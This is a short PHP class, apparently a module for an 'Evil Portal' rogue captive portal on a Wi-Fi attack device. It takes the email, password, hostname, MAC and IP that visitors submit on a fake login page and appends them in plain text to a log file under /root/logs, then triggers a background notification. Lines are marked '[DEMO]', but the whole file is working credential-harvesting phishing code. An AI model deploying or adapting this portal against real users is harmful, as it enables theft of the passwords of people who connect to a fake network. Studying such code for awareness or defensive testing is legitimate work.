<?php namespace evilportal;

class MyPortal extends Portal
{

    public function handleAuthorization()
    {
        if (isset($_POST['email'])) {
            $email = isset($_POST['email']) && $_POST['email'] !== '' ? trim($_POST['email']) : 'email';
            $password = isset($_POST['password']) && $_POST['password'] !== '' ? $_POST['password'] : 'password';
            $hostname = isset($_POST['hostname']) ? $_POST['hostname'] : 'hostname';
            $mac = isset($_POST['mac']) ? $_POST['mac'] : 'mac';
            $ip = isset($_POST['ip']) ? $_POST['ip'] : ($_SERVER['REMOTE_ADDR'] ?? 'ip');

            $logDir = '/root/logs';
            if (!is_dir($logDir)) {
                @mkdir($logDir, 0777, true);
            }

            $logFile = $logDir . '/evillogs.log';
            $entry = "[DEMO] " . date('Y-m-d H:i:s') . "Z\n" .
                "email: {$email}\n" .
                "password: {$password}\n" .
                "hostname: {$hostname}\n" .
                "mac: {$mac}\n" .
                "ip: {$ip}\n\n";

            @file_put_contents($logFile, $entry, FILE_APPEND | LOCK_EX);

            $this->execBackground('notify demo-login test');
        }

        parent::handleAuthorization();
    }

    public function onSuccess()
    {
        parent::onSuccess();
    }

    public function showError()
    {
        parent::showError();
    }
}
